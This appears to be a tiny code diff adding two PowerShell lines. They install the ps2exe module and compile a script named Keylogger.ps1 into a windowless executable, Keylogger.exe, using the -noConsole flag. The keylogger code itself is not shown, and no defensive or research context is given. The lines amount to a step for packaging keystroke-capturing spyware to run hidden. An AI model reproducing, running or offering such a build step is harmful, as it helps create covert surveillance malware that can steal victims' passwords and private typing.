@@ -1,0 +1,2 @@
+Install-Module ps2exe
+Invoke-ps2exe "Keylogger.ps1" "Keylogger.exe" -noConsole
